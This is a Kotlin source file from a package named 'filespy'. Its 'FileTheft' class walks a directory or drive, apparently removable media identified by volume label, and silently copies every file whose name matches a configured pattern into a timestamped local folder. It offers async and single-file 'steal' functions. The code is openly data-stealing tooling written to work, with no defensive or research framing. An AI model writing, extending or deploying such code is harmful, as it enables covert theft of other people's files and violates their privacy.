package studio.papercube.sh.filespy

import studio.papercube.library.fileassist.DriveMarker
import studio.papercube.library.fileassist.getVolumeLabel
import studio.papercube.library.fileassist.validateFileName
import java.io.File
import java.time.LocalDate
import java.time.LocalTime
import java.util.concurrent.CompletableFuture
import java.util.regex.Pattern

class FileTheft(val directory: File) : Theft {
    companion object {

        @JvmStatic fun timeStamp() = System.currentTimeMillis()

        @JvmStatic fun stealSingleFile(f: File,
                                       destDir: File = File("${ConfigParameters.instance.dataPath}/${LocalDate.now()}/")): Boolean {
            try {
                val targetFile = File("${destDir.absolutePath}/${f.nameWithoutExtension}-${timeStamp()}.${f.extension}")
                f.copyTo(targetFile, bufferSize = 16384)
                targetFile.setLastModified(f.lastModified())
            } catch (e: Exception) {
                e.printStackTrace()
                return false
            }
            return true
        }

    }

    override fun steal() {
        val pattern = Pattern.compile(ConfigParameters.instance.regex, Pattern.CASE_INSENSITIVE).toRegex()
        val driveMarker = DriveMarker(directory)
        val destDir = File(
                "${ConfigParameters.instance.dataPath}/" +
                        "${LocalDate.now()}/${LocalTime.now().toString().validateFileName()}-${directory.absolutePath.first()}-${directory.getVolumeLabel().validateFileName()}-${driveMarker.markID()}"
        )
        FileWalker(directory).walk()
                .stream()
                .filter { it.name.matches(pattern) }
                .forEach { stealSingleFile(it,destDir) }
    }

    fun stealAsync(): CompletableFuture<Unit> {
        return CompletableFuture.supplyAsync { steal() }
    }


}